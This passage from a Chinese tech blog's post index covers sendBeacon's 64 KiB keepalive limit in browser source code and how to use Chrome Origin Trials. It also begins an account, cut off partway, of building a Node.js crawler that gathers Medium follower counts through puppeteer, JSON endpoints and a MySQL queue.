queued data of 64Kb for keepalive requests\"_s, ResourceError::Type::AccessControl &#125;); failBeforeStarting(); return; &#125; 如果是 keepalive，而且 type 不是 ping（sendBeacon 的 type 會是 Type::Beacon），又沒辦法註冊新的請求，就回傳這個錯誤。 因此重點就是 keepaliveRequestTracker().tryRegisterRequest 這個方法了，在 Source&#x2F;WebCore&#x2F;loader&#x2F;cache&#x2F;KeepaliveRequestTracker.cpp： const uint64_t maxInflightKeepaliveBytes &#123; 65536 &#125;; // 64 kibibytes as per Fetch specification. bool KeepaliveRequestTracker::tryRegisterRequest(CachedResource&amp; resource) &#123; ASSERT(resource.options().keepAlive); auto body = resource.resourceRequest().httpBody(); if (!body) return true; uint64_t bodySize = body->lengthInBytes(); if (m_inflightKeepaliveBytes + bodySize > maxInflightKeepaliveBytes) return false; registerRequest(resource); return true; &#125; 其實也就只是算一下還在等待的有多少，加上去會不會超過最大值 65536，做的事情跟 Sentry 最後的那個 PR 差不多。 Firefox 的 sendBeacon 實作在之前 Sentry 的 PR 中其實就有提到 Firefox 不支援 keepalive，對應到的 ticket 是這張：[meta] Support Fetch keepalive flag and enforce limit on inflight keepalive bytes，目前還沒被關閉，從討論中看起來似乎半年前開始有了進展，在 2024 年 11 月推出的 Firefox 133 版本中正式開始支援，雖然還有一些 bug，但應該會越來越穩定。 我用三個瀏覽器測試了一個情境，送出 10 個長度 6 萬的字串： &lt;script> for(let i=1; i&lt;=10; i++) &#123; navigator.sendBeacon(\"https://httpstat.us/200?log\"+i, 'A'.repeat(60000)); &#125; &lt;/script> Chrome 跟 Safari 都只送出了一個請求，但是 Firefox 133.0.3 倒是很貼心地全部都送出去了，目前還沒有 64 KiB 的限制： 如果有人好奇底層實作，程式碼在這裡：gecko-dev&#x2F;dom&#x2F;base&#x2F;Navigator.cpp，目前看起來應該還沒把 keepalive 整進去，所以才沒有觸發到上限。未來應該會按照 spec 走，使用 keepalive 請求，並且遵守 payload 的大小限制。 結語小功能大學問，一個看似簡單的 sendBeacon，其實深入研究之後也滿有趣的，知道了它的限制、解法，也能從 Sentry 的修補過程中學到一些經驗，還看了瀏覽器的原始碼，更理解背後的實作。 總之呢，在實務上若是要使用 sendBeacon，都請記得加個錯誤處理，在回傳值是 false 時，改成一般的 fetch 或是加上重試機制，才能加強資料傳輸的穩定性。","link":"/2025/01/06/navigator-sendbeacon-64kib-and-source-code/"},{"title":"透過 Chrome Origin Trials 搶先試用新功能","text":"如果你的網站想要搶先體驗瀏覽器還沒有正式上線的新功能，該怎麼做呢？ 通常這些功能已經做好了，只是沒有開放而已，因此瀏覽器都會提供一些可以開關的 flag，只要把開關打開，就能夠搶先體驗到新功能，但我們通常不太可能叫使用者自己把開關打開。 因此，Chrome 提供了一個機制叫做 origin trials，你可以在網站上註冊，取得一組 token，接著只要設置好以後，如果使用者是用 Chrome 造訪你的網站，那就會開啟新功能，讓你的網站可以使用。 這篇就來簡單介紹一下這個機制該如何使用。 挑選功能這個頁面有目前 Chrome Origin Trials 提供的所有功能：https://developer.chrome.com/origintrials/#/trials/active 每個功能點進去以後都會有詳細的說明，舉例來說，我們可以點進去：「App History API」，就會看到詳細的說明： 上面會簡單介紹一下這個功能在幹嘛，以及開放的版本跟結束日期，通常還會再搭配兩個資源，例如說「Learn More」按下去以後可能會連到一篇介紹這個功能的文章，像這篇：Modern client-side routing: the App History API，就是在介紹 App History API 的基本使用。 而另一個資源則是 Chrome Platform Status，點下去之後會出現更詳細的頁面，頁面裡面給出目前的狀況跟預計的發佈時間，還有 spec 的連結，以及其他瀏覽器對於這個功能是否會跟進： 會開放給 origin trials 的功能大部分是新功能，不過有少部分會是已經被淘汰或是快要被淘汰的功能。 這是為什麼呢？因為有些網站可能還需要多一點時間更新，就可以來這邊申請 origin trials，瀏覽器就會先把舊功能留著，讓網站有更多時間可以更新。因此，origin trials 提供的不只是新功能，也會有已經被淘汰的功能。 總之呢，如果你好奇有哪些新功能可以試用，可以來這個網站尋寶。 試用功能接著我們實際來試用看看 App History API 這個功能，這個新功能是設計給 SPA 用的，因為現有的 History API 誕生時 SPA 還沒有開始流行，所以有很多需求都不太符合，需要一組新的 API。 詳細的介紹可以參考：Modern client-side routing: the App History API 總之呢，如果這個功能可以用的話，我們應該要可以存取 appHistory 這個東西，現在因為功能還沒開放，所以存取只會出現：Uncaught ReferenceError: appHistory is not defined 的錯誤。 在 Chrome Origin Trials 的頁面挑好想用的功能以後，點進去之後再點 REGISTER，就會進到註冊頁面，接著要輸入想試用的網站的 origin，畢竟都叫做 origin trials 了，就是「指定哪些 origin 可以試用」的意思，像這樣： 申請完成以後，就會給你一組 token 還有過期時間，會跟你說可以用到什麼時候，像這樣： 接下來很簡單，只要在你想試用的頁面上加上一個 meta tag 就好： &lt;meta http-equiv=\"origin-trial\" content=\"TOKEN\"> 也可以用 HTTP header：Origin-Trial: TOKEN 為了方便 demo，我準備了一個頁面，內容如下： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"robots\" content=\"noindex\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;meta http-equiv=\"origin-trial\" content=\"AnmLpSv09ah5QRsTiszCUGI8WzgiH5OByD2I/kQjnbSSmN2DMnuvRsbPWfqN7QmDJbNH6cUBvsay+UlJBwQyXwcAAABXeyJvcmlnaW4iOiJodHRwczovL2Fzeng4NzQxMC5naXRodWIuaW86NDQzIiwiZmVhdHVyZSI6IkFwcEhpc3RvcnkiLCJleHBpcnkiOjE2NDc5OTM1OTl9\"> &lt;/head> &lt;body> origin trial demo &lt;script> if (window.appHistory) &#123; document.writeln('appHistory exists!') &#125; else &#123; document.writeln('appHistory is not defined') &#125; &lt;/script> &lt;/body> &lt;/html> 會偵測有沒有 appHistory，並將結果顯示在畫面上。 設置完成以後，造訪這個頁面：https://aszx87410.github.io/demo/misc/origin-trial.html 如果你用 Chrome 以外的瀏覽器開，會看到：「appHistory is not defined」，用 Chrome 的話，應該會看到：「appHistory exists!」。 打開 devtool -&gt; Application -&gt; Frames -&gt; top，可以看到我們順利啟用了 origin trials： 沒錯，這整個流程就是這麼簡單。 結語這篇簡單介紹了一下 Origin Trials 這個機制，可以透過這個機制去申請一組 token，將其放到網站上以後，就能讓 Chrome 的使用者們搶先試用新功能。 像是 three.js 的範例頁面，就有用到 origin trial 來開啟 WebGPU 相關功能：three.js&#x2F;examples&#x2F;webgpu_skinning.html 除此之外，就算沒有想要體驗新功能，也可以偶爾來這邊看看，光是看看就能夠收穫不少，例如說我從列表中就看到了「App History API」、「Private Network Access from non-secure contexts」以及「User Agent Reduction」這幾個從來沒聽過的東西。","link":"/2022/02/02/origin-trials-try-new-feature/"},{"title":"Medium 爬蟲進化史","text":"前言前幾天的時候我在 Medium 上發了這篇文：Medium 中文寫作者追蹤人數排名與不專業數據分析，內文是我用 Node.js 寫了一個簡單的 Medium 爬蟲之後整理出來的數據。 在原本那篇文章裡面有簡單提到爬蟲的資料來源，但是對技術的部分沒有太多著墨。事實上，在寫 Medium 爬蟲的時候其實踩了一些坑，與其教大家寫一個 Medium 爬蟲，不如讓大家跟我一起走過這些坑，盡可能地還原我當初在寫這個爬蟲時碰到的障礙以及解決方法，我覺得這樣會更有趣一點。 因此，這篇就是用來記錄我寫這個 Medium 爬蟲的經過，其中也會有點教學的成份在，所以看完之後你應該也能夠寫出一個類似的爬蟲，或至少你看到 source code 的時候不會一頭霧水。 雖然說最後寫出來的是這個跟使用者資料有關的爬蟲，但我一開始其實是先從文章列表開始的，因為那時候剛好有一個需求，想要把自己的文章全部爬下來。 會有這個需求是因為 Medium 內建的功能其實滿爛的，你很難找到一個作者 po 過的所有文章，或者是說很難一目瞭然。所以早期的文章除了透過 Google 以外，是很難被找到的。 所以我後來就手動做了一個文章的索引，自己整理了以前發過的所有文章。但是身為工程師，這明明就是一件可以寫程式來做的事啊！所以想嘗試看看能不能先寫一個文章列表的爬蟲。 第一次嘗試：尋找資料來源對我來說，爬蟲的第一步也是最困難的一步就是找到資料來源。只要這一步完成了，其他的相比之下都比較簡單。 如果能拿到 Medium 的 API 那當然是最好的。若是沒有的話，就必須用 puppeteer 之類的東西去爬 HTML 然後自己 parse 了。 在 Medium 的文章列表那邊捲動一下並且打開 devtool，可以看到 medium 後面是用 GraphQL： 這個就麻煩了…我對 GraphQL 不太熟，要花時間去研究一下它的資料結構，感覺要花不少時間，於是那時我就暫時先放棄這條路，決定來試試看用 puppeteer。 第二次嘗試：puppeteer如果你不知道什麼是 puppeteer，我在這邊簡單介紹一下。你可以想成 puppeteer 會自動幫你打開一個瀏覽器，你可以寫程式去操控這個瀏覽器。例如說我要打開一個頁面並且在這頁面上執行 JS 等等，所以使用 puppeteer 的話，爬蟲的原理就是打開某個頁面，執行一段 JS 拿到頁面上的資料。 puppeteer 用起來很簡單，只要找一下現成的範例看一下語法，改一改就可以直接拿來用了。稍微研究了一下 HTML 結構之後，可以寫出下面的程式碼： const puppeteer = require('puppeteer') async function main() &#123; const username = 'hulitw' const url = 'https://medium.com/@' + username const browser = await puppeteer.launch(&#123; headless: true &#125;) // 造訪頁面 const page = await browser.newPage() await page.goto(url, &#123; waitUntil: 'domcontentloaded' &#125;) // 執行準備好的 script 並回傳資料 const data = await page.evaluate(mediumParser) console.log(data) await page.close() await browser.close() &#125; function mediumParser() &#123; // selector 是透過觀察而得來的 const elements = document.querySelectorAll('section > div:nth-child(2) > div > div') const result = [] for (let i = 0; i &lt; elements.length; i++) &#123; const h1 = elements[i].querySelector('h1') const a = elements[i].querySelectorAll('a') if (h1) &#123; result.push(&#123; title: h1.innerText, link: a[3].href &#125;) &#125; &#125; return result &#125; main() 只要觀察出 HTML 與 CSS 的規則之後，就可以取得想拿的資料。但 Medium 不好爬是因為在 class name 的部分有使用 functional CSS，而且 class 的命名都有經過處理，看起來是用程式自動去跑的，所以只要 Medium 一更新，元素的命名應該會不太一樣。 所以最後只能從 HTML 的結構下手，去把文章給抓出來。 解決了這個問題之後，還有一個問題，那就是無限捲動。Medium 跟很多網頁一樣，要一直往下滑才會載入新文章，而這邊必須觀察的規律是滑到什麼時候才要停止。 觀察之後發現當發表過的文章載入完以後，才會顯示 Highlighted by xxx 這個區塊，所以可以用這個元素有沒有出現當作終止條件。 接著可以寫一段程式碼，讓頁面不斷往下捲動直到載入所有文章為止： /* 要用的話就是： await scroll(page) */ function getArticlesCount() &#123; const elements = document.querySelectorAll('section > div:nth-child(2) > div > div') return elements.length &#125; async function scroll(page) &#123; await page.evaluate('window.scrollTo(0, document.body.scrollHeight)') try &#123; // 終止條件 await page.waitForSelector('h4 ~ p', &#123; timeout: 1000 &#125;) &#125; catch(err) &#123; // 印出目前抓到的文章數目 const count = await page.evaluate(getArticlesCount); console.log(`Fetching... $&#123;count&#125; articles`) // 繼續往下捲動 await scroll(page); &#125; &#125; 為了在 console 上讓我能看到現在的進度（可以確認程式是不是有 bug），還加了一段是每一次捲動都會印出現在畫面上有的文章數量。 做到這邊，就可以抓到使用者所有的文章標題以及連結了。 那發文日期呢？也拿得到嗎？ 拿得到，但是麻煩很多。看看下面的 Medium 截圖就知道了： 如果是今年（2019）的文章，就不會顯示年份，否則的話就會顯示出發文年份。所以這邊要再經過特殊的判斷處理，而且只拿得到日期，拿不到詳細發文時間。 做到這邊，我就懶得再繼續下去了。想說有很多眉眉角角要處理，而且抓到的資料有限，還不如轉去研究 API 比較實在。 第三次嘗試：puppeteer + API前面已經說過我那時對 GraphQL API 不熟，所以暫時放棄了。但是嘗試了 puppeteer 之後，反而讓我有了新的思路。 在 puppeteer 裡面你可以加上監聽 network response 的事件，而頁面在載入文章的時候，一定會呼叫 API 去拿文章。這樣子事情不就好辦多了嗎？我不用自己研究怎麼 call API，我讓頁面自己去 call API，我自己只要監聽 response，研究一下 response 的格式就行了！ 程式碼大概是長這樣的： const apiResponses = [] page.on('response', async (response) => &#123; if (response._url.indexOf('graphql') &lt; 0) return const json = await response.json() try &#123; const post = parsePosts(json) apiResponses.push(...post) &#125; catch (err) &#123; &#125; &#125;) function parsePosts(json) &#123; const result = [] try &#123; // 研究到一半沒做完 const streams = json.data.user.profileStreamConnection.stream for (stream of streams) &#123; if (stream.itemType.__typename === 'StreamItemCompressedPostList') &#123; &#125; &#125; &#125; catch (err) &#123; &#125; &#125; 每次有新的 response 進來就可以解析一下並丟到 array 裡面，最後拿到的就會是完整的從 API 傳來的資料。 但後來我發現這條路也行不通。 為什麼呢？因為頁面在第一次載入的時候，從 Server 回傳的 HTML 就已經有前幾筆文章的資料了，往下捲動的時候才是使用 ajax 來載入新的文章。意思是說，如果我想靠監聽 ajax response 的方式拿到所有文章的資料是沒辦法的，前幾筆是拿不到的。 做到這邊的時候我有點心灰意冷，想說花了兩天寫出一個不能用的東西。抓取文章列表的部分做到這我就放棄了，懶得繼續花時間去研究，並且把心力轉向我真正想抓的東西。 最前面提到的抓文章列表的需求其實是突然蹦出來的，在這之前我有更想抓的東西：follower，我想統計臺灣寫作者的 follower 人數，然後看看自己可以排到第幾名（滿足一下虛榮心）。 在嘗試了抓文章列表並失敗以後，我有試過用類似的方式去抓 follower，但做到一半發現這樣抓的話效率也太差了，每次捲動載入 25 個 follower 的話，1000 人可是要捲動 40 次。 自己如果做不出來的話，答案就很明顯了：Google，就拜託你了！ 第四次嘗試：Google 大神直接在 Google 打上關鍵字：medium follower api，出現的第一個搜尋結果是最無用的官方 API，幾乎什麼資料都沒給，而且要申請還要寄信給客服，有夠麻煩。 但是第二個搜尋結果讓我眼睛為之一亮，是一個 gist 檔案：Medium API: get number of followers for User · GitHub。 程式碼才五十行而已，很短，掃過一遍可以看到最關鍵的一行： // BUILD THE URL TO REQUEST FROM function generateMediumProfileUri(username) &#123; return `https://medium.com/@$&#123;username&#125;?format=json`; &#125; 什麼！原來還有這招，在網址後面加 ?format=json 就可以拿到 json 格式的資料，這真是太神奇了。 把得到的資料丟到 JSON Formatter 之後，可以看到大概的結構： 在這邊可以拿到使用者的個人資料以及發過的一些文章，也可以拿到我們的目標：follower！ 我們順便來看一下使用者資料可以拿到些什麼： \"user\":&#123; \"userId\":\"f1fb3e40dc37\", \"name\":\"Huli\", \"username\":\"hulitw\", \"createdAt\":1487549030919, \"imageId\":\"1*WQyJUJBQpBNIHH8GEWE6Sg.jpeg\", \"backgroundImageId\":\"\", \"bio\":\"自學程式，後來跑去唸哲學系但沒念完，前往新加坡工作了兩年半後決定放一年的假，到處旅遊。喜歡教學，發現自己好像有把事情講得簡單又清楚的能力，相信分享與交流可以讓世界更美好。\\bMedium 文章列表請參考：https://aszx87410.github.io/blog/medium\", \"allowNotes\":1, \"mediumMemberAt\":1542441600000, \"isNsfw\":false, \"isWriterProgramEnrolled\":true, \"isQuarantined\":false, \"type\":\"User\" &#125; 除了基本的自介跟姓名以外，還可以拿到成為 Medium 付費會員的時間以及成為 Medium 會員的時間，還滿有趣的，還有一個 flag 也很有趣：isNsfw。 唯一缺的就是 follower 的清單了。 這邊我嘗試用一樣的方法，在 Medium 網址後面接了參數：https://medium.com/@hulitw/followers?format=json，沒想到還真的有東西！在 response 裡面可以找到 10 個 follower 的資料。 有了資料之後就確定這個 API 是有用的，再來直接跳到 response 最下面 paging 的部分： \"paging\":&#123; \"path\":\"https://medium.com/_/api/users/f1fb3e40dc37/profile/stream\", \"next\":&#123; \"limit\":10, \"to\":\"10590c54e527\", \"source\":\"followers\", \"page\":2 &#125; &#125; path 的部分看起來是個 API 網址，next 應該是參數，試著把這些參數帶到網址上面：https://medium.com/_/api/users/f1fb3e40dc37/profile/stream?limit=10&amp;to=10590c54e527&amp;source=followers&amp;page=2 ，就出現了只有 follower 相關的資料！ 試著把 limit 換一下，發現最大值應該是 25，一次可以抓 25 筆資料；page 換一下之後發現沒什麼作用，於是把 to 也改一下，發現可以成功抓到新的資料。看來分頁機制是採用 cursor based 的。 在經過了幾次嘗試之後，終於拿到了兩個 API 的網址，一個可以獲得詳細個人資料，另外一個可以拿到 follower 的列表！ 資料來源確定有了之後，就可以來構思一下爬蟲的架構了。 爬蟲架構我要怎麼樣才能儘可能爬到所有的台灣寫作者？ 首先第一個問題是我們必須把範圍放大一點，因為中文寫作者裡面可能有香港來的或是中國來的，你比較難靠程式去辨別到底是哪裡來的，尤其是香港跟台灣，因為都使用繁體中文。 為了不讓問題變得更複雜，我們只要能抓到「中文使用者就好」。 那要怎麼樣才能抓到最多中文使用者？一個很簡單的策略就是我們預設中文使用者的 follower 應該都是中文使用者，所以我們只要從某個使用者開始，把他所有的 follower 都丟進一個 queue 裡面，一直持續這個動作就好。 用文字簡化就是這樣： 從 queue 裡面拿出一個使用者 把他的資料寫進資料庫 把他的所有 follower 丟進 queue 回到步驟一 這樣子就可以靠著一個使用者無限延伸出去，而且理論上來說可以抓到超級多使用者的資料。這邊之所有選擇 follower（追蹤我的人）而不是 following（我追蹤的人），是考量到追蹤的使用者可能會有別的國家的，例如說我可能會追蹤國外的工程師之類的，但因為我不寫英文，所以國外的工程師應該不會來追蹤我。這樣的話就可以讓使用者侷限在中文，符合我們的目標。 接著就是系統架構的部分，這邊依據你想達成的效率會有不同種做法。 對我來說效率會最高的就是找那種很適合用來當 queue 的 service，例如說 redis 之類的，然後資料庫的部分可以選用 MySQL 或任何你熟悉的軟體。這樣子的好處是你可以開不同機器，然後每一台機器都是一個 worker，例如說你開五台機器，就會有五個 worker 一直從 queue 裡面拿東西出來並且把 follower 丟進去。 這邊之所以開很多台機器而不是開很多 thread 或 process，是因為 rate limiting 的問題。一般 API 都會有流量限制，你如果同一個 IP 發太多 request 會被 ban 掉或者是一段時間拿不到 response，所以開再多 process 跟 thread 都沒有用，只能開不同機器來解決（或只要有辦法換 IP 的話就可以）。 後來因為我沒有很在乎效率而且懶得開很多機器，所以只打算開一台讓他慢慢抓。如果只有一個 worker 的話，queue 的部分也可以簡單做一下，這邊我就也用 MySQL 來實做簡單的 queue，讓整個爬蟲的架構變得很簡單。 我們可以來看一下資料庫的架構： Users id userId username name bio follower fr mediumMemberAt createdAt 自增ID 使用者 ID 前面加上 @ 就是 profile 網址 使用者名稱 自介 追蹤人數 分類 成為付費會員的時間 加入會員的時間 Queue id userId 自增ID 使用者 ID 程式的執行流程是這樣的： 從 Queue 裡面拿出一個 userId 如果 userId 已存在 Users，回到步驟一 把他的資料寫進 Users 把他的所有 follower 丟進 Queue 回到步驟一 從 queue 拿出來的時候先確保沒有爬過這個使用者，有的話就跳過，然後把所有追蹤者再丟到 queue 裡面，這樣程式就會一直跑，直到 queue 裡面沒有東西為止。 架構設計好之後，就可以來開始 coding 啦！ 第一版爬蟲首先我們需要有一個 queue，能夠 push 跟 pop，還要能確定現在拿的 userId 是不是已經爬過了。這個很適合用 class 來實作： class Queue &#123; constructor(conn) &#123; this.conn = conn &#125; get() &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Queues limit 1', (error, results) => &#123; if (error) &#123; console.log(error) return reject(error) &#125; if (results.length !== 1) &#123; return resolve(null) &#125; const data = results[0] this.conn.query('DELETE from Queues where userId=?', [data.userId], (err, results) => &#123; if (error) &#123; console.log(error) return reject(error) &#125; return resolve(data.userId) &#125;) &#125;); &#125;) &#125; check(uid) &#123; return new Promise((resolve, reject) => &#123; this.conn.query('SELECT userId from Users where userId=?', [uid], function (error, results) &#123; if (error) &#123; return reject(error) &#125; if (results.length > 0) &#123; return resolve(false) &#125; return resolve(true) &#125;); &#125;) &#125; push(list) &#123; return new Promise((resolve, reject) => &#123; const values = [] for (let item of list) &#123; values.push([item]) &#125; this.conn.query(` INSERT IGNORE INTO Queues (userId) VALUES ?`, [values], (err) => &#123; if (err) &#123; // console.log(err) &#125; resolve() &#125; ) &#125;) &#125; &#125; 有了 queue 以後可以來寫主要邏輯，主程式的架構會長這樣： var connection = mysql.createPool(&#123; connectionLimit : 10, host : process.env.host, user : '', password : '', database : 'medium', charset: 'utf8mb4' &#125;) async function main() &#123; const queue = new Queue(connection) // 不斷從 queue 拿東西出來 while(true) &#123; const userId = await queue.get() if (!userId) &#123; console.log('no data from queue, end') break; &#125; // 看看是否已經爬過，爬過就跳掉 const check = await queue.check(userId) if (!check) &#123; continue &#125; // 拿 userId 做你想做的事 console.log('uid:', userId) &#125; &#125; 接著只要實作以下兩個功能就好： 抓取使用者資料 把使用者資料寫進資料庫 把 follower 丟回 queue 由於 Medium API 的 response 都會有一個防 json hijacking 的開頭，因此我們可以包裝一個函式專門來 parse API 的 response： async function getMediumResponse(url) &#123; try &#123; const response = await axios.get(url) const json = JSON.parse(response.data.replace('])&#125;while(1);&lt;/x>', '')) return json &#125; catch(err) &#123; return null &#125; &#125; 接著就可以寫兩個 function，一個抓使用者資料，一個抓 follower 資料（有出現 _ 的都是 lodash 的 function）： async function getUserInfo(uid) &#123; const url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream` const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const userId = _.get(json, 'payload.user.userId') const follower = _.get(json, `payload.references.SocialStats.$&#123;userId&#125;.usersFollowedByCount`, 0) return &#123; followerCount: follower, userId: userId, name: _.get(json, 'payload.user.name'), username: _.get(json, 'payload.user.username'), bio: _.get(json, 'payload.user.bio'), mediumMemberAt: _.get(json, 'payload.user.mediumMemberAt'), isWriterProgramEnrolled: _.get(json, 'payload.user.isWriterProgramEnrolled'), createdAt: _.get(json, 'payload.user.createdAt'), &#125; &#125; async function getFollowers(uid, to) &#123; let url = `https://medium.com/_/api/users/$&#123;uid&#125;/profile/stream?source=followers&amp;limit=200` if (to) &#123; url += '&amp;to=' + to &#125; const json = await getMediumResponse(url) if (!json) &#123; return &#123;&#125; &#125; const followers = _.keys(json.payload.references.Social) || [] const nextTo = _.get(json, 'payload.paging.next.to') return &#123; followers, nextTo &#125; &#125; 基本上都是 call API 之後稍微處理一下資料，然後把我們關注的東西傳回去。 上面我們只實做了「抓一次 follower」的 function，所以最後還要再實作一個「抓全部 follower 並且丟進 queue」的 function： async function getAllFollowers(uid, queue) &#123; const followers = [] let to = undefined while (true) &#123; const data = await getFollowers(uid, to) if (!data) &#123; break; &#125; followers.push(...data.followers) to = data.nextTo console.log(uid, 'fetching...', followers.length) if (data.followers.length === 0 || !to) &#123; break; &#125; await queue.push(data.followers) &#125; return followers &#125; 這個函式會不斷去抓 follower 出來並丟進 queue，並且印出現在總共抓了幾筆 follower 的資料，全部抓完會把所有的 follower 回傳回去（會回傳是因為一開始我是全部抓完才一次寫進 queue，但後來發現比較沒效率，所以改成現在這樣抓一次就寫一次）。 最後是把使用者資料寫進去資料庫的程式碼： function format(time) &#123; if (!time) return null return moment(time).format('YYYY-MM-DD HH:mm:ss') &#125; function saveUserInfo(conn, info) &#123; conn.query(` INSERT INTO Users ( userId, username, name, bio, follower, mediumMemberAt, createdAt, isWriterProgramEnrolled ) VALUES ?`, [[[ info.userId, info.username, info.name, info.bio, info.followerCount, format(info.mediumMemberAt), format(info.createdAt), info.isWriterProgramEnrolled ]]], (err) => &#123; if (err) &#123; // console.log(err) &#125; &#125; ) &#125; 把這幾個核心功能的 function 寫完以後，只要修正一下我們的主程式，就可以把整個爬蟲完成了： async function main() &#123; const queue = new Queue(connection) while(true) &#123; // 1. 從 Queue 裡面拿出一個 userId const userId = await queue.get() if (!userId) &#123; console.log('no data from queue, end') break; &#125; // 2. 如果 userId 已存在 Users，回到步驟一 const check = await queue.check(userId) if (!check) &#123; continue &#125; console.log('uid:', userId) try &#123; const info = await getUserInfo(userId) // 如果沒抓到資料有可能是被擋了，先停個 3 秒 if (!info.userId) &#123; console.log('sleep...') await sleep(3000) &#125; // 3. 把他的資料寫進 Users saveUserInfo(connection, info) // 4. 把他的所有 follower 丟進 Queue if (info.followerCount > 0) &#123; // 把 followers 放到 queue 並印出總共幾筆資料 const followerList = await getAllFollowers(userId, queue) console.log('Add ' + followerList.length + ' into queue.') &#125; &#125; catch(err) &#123; // 有錯誤就先睡個 3 秒 console.log('error...sleep') await sleep(3000) &#125; &#125; &#125; 上面就是我們按照先前的邏輯寫出來的程式碼： 從 Queue 裡面拿出一個 userId 如果 userId 已存在 Users，回到步驟一 把他的資料寫進 Users 把他的所有 follower 丟進 Queue 回到步驟一 不過這邊額外加了一個邏輯是當呼叫 API 有問題的時候，就先暫停 3 秒鐘，這樣是為了防止被 rate limiting 擋到。但這個機制做的不是很好，因為沒有 retry，所以一但發生錯誤，這個 userId 就被跳過了。 當初的想法是只跳過一個 userId 無傷大雅，畢竟 queue 裡面可能有十萬筆的 userId，而且就算跳過，之後還是有可能再被丟到 queue 裡面，所以不做 retry 的機制也無所謂。 上面的程式碼全部組裝起來，就是第一版爬蟲的雛形了。運作的 ok 沒什麼問題，就只是速度比較慢而已。而且 queue 增長的速度比想像中驚人，我跑了一個晚上 queue 大概就多了十萬筆資料，而 users 裡面卻只有四五千筆而已。 不過在跑了一個晚上之後，我發現了一個致命的錯誤。 第二版爬蟲：判斷中文這個致命的錯誤就是當初的預設：「中文作者的 follower 都是中文作者」是有問題的，而且仔細想想會發現這個預設的確很不可靠。 所以跑了一個晚上的爬蟲，我發現資料庫裡面多了一大堆外國使用者。而且一但多了一個，你的 queue 裡面就會出現一大堆的外國使用者。 為了避免這個情形，我決定從自介跟暱稱下手，寫一個判斷自介跟暱稱是否含有中文的函式，如果有中文才被放進來。這邊我直接複製在 Stack Overflow 上找到的程式碼，看起來十分神奇： function isChinese(text = '') &#123; // @see: https://stackoverflow.com/questions/44669073/regular-expression-to-match-and-split-on-chinese-comma-in-javascript/51941287#51941287 const regex = /(\\p&#123;Script=Hani&#125;)+/gu; return text.match(regex) &#125; 在 queue 裡面抓完使用者資料後會進行判斷： const info = await getUserInfo(userId) // 非中文，直接略過 if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123; continue; &#125; 做這個判斷的時候我就已經想到會有一個問題，那就是有些人他們喜歡國際化一點，在自介會放全英文，暱稱也會是英文，所以會被誤判。明明就是用中文寫作，但是卻沒有被加進 queue 裡面。 這邊我當時覺得無所謂，畢竟這樣的人不多，而且要解的話有點麻煩。當時我腦中本來就有浮現一個解法，就是去抓他最近拍手過或發表過的文章，看看標題是不是中文，這樣的判斷會準確很多。但當時我懶得實作，想說先讓爬蟲繼續跑一天看看。 隔天早上，又發現了一個完全沒想過會碰到的問題。 第三版爬蟲：判斷日文使用者清單裡面出現一大堆日本人。 因為他們有些暱稱是漢字，要嘛就是自介有漢字，所以不會被中文判斷篩掉。發現這個問題的時候我第一個想法是：「如果這是在面試我一定被刷掉，這種 case 居然當初沒想到…」。 為了解決這種情況，就再找了一個判斷是不是有日文（不含漢字）的正則表達式： function isJapanese(text = '') &#123; // @see: https://gist.github.com/ryanmcgrath/982242 const regexJP = /[\\u3040-\\u309F]|[\\u30A0-\\u30FF]/g; const jp = text.match(regexJP) if (jp &amp;&amp; jp.length >= 3) &#123; return true &#125; return false &#125; 如果含有三個以上的日文字母，就回傳是日文。這邊會設定數量是我怕有些台灣人用什麼 の 之類的，就會被誤判。不過除了寫死數量以外，還有個比較好的做法可能是看比例，例如說一句話如果有八九成是中文字，就是中文之類的。 判斷邏輯的部分改成這樣： const info = await getUserInfo(userId) // 非中文，直接略過 if (!isChinese(info.bio) &amp;&amp; !isChinese(info.name)) &#123; continue; &#125; if (isJapanese(info.bio) || isJapanese(info.name)) &#123; continue; &#125; 如果不是中文就跳過，再來確認是不是日文，如果自介或是暱稱是日文也跳過。 好，這樣就沒有問題了吧！於是我把資料砍光，再讓爬蟲跑一個晚上試試看。 隔天起來，發現我真是天真的可以。 第四版爬蟲：直接重構打開資料庫，發現還是有很多日本使用者。原因在於他們可能暱稱是用漢字，然後沒有寫自介，或者自介只有一兩個字之類的，所以還是會被判定為是中文使用者。 追根究底，都是這個判斷機制太不可靠的原因。 既然事情已經到這個地步，就沒辦法偷懶了，我只能實作剛開始提到的更準確的解法：「看看最近發表過或是拍手過的文章是不是中文」，而這部分的資料幸好原本的 API 就有提供，實作起來比想像中簡單許多。 除了這個以外，由於 queue 增長的速度比消耗的速度快太多，因此我一度改變了一下方法。我寫了另外一支小程式，把原本流程中的「把 followers 丟到 queue」拿掉，並且一次拿 10 筆使用者資料出來。 換句話說，這個新的小程式做的事情很簡單，就是不斷抓使用者資料並存到資料庫，這樣 queue 就會一直變小，讓使用者資料愈來愈多。大概一個小時可以抓兩萬筆，累積一個晚上的 queue 白天花半天就可以跑完。 好處就是我可以快速累積使用者資料，畢竟原本的實作太慢了，一天大概只能跑個一萬筆左右，現在新的實作因為不用把東西丟到 queue 裡面，會讓使用者資料長得很快。 那時候偷懶直接複製程式碼改一下就做完這個新的小程式，導致程式寫到這邊愈來愈亂，考量到之後想要 open source，是時候整理一下程式碼了，於是就順便把程式重構一下。 重構完的架構如下： . ├── README.md &#x2F;&#x2F; 說明 ├── app.js &#x2F;&#x2F; 主程式 ├── getUsers.js &#x2F;&#x2F; 只抓使用者資料的小程式 ├── config.js &#x2F;&#x2F; 設定檔 ├── db.js &#x2F;&#x2F; 資料庫相關 ├── medium.js &#x2F;&#x2F; medium API 相關 ├── package.json ├── queue.js └── utils.js 我們先從 config 開始看起吧： module.exports = &#123; db: &#123; connectionLimit: 10, host : '', user : '', password : '', database : 'medium', charset: 'utf8mb4' &#125;, batchLimit: 1, // 一次抓多少筆使用者資料 randomDelay: function() &#123; return Math.floor(Math.random() * 200) + 100 &#125;, errorRateTolerance: 0.2, delayWhenError: 500 &#125; 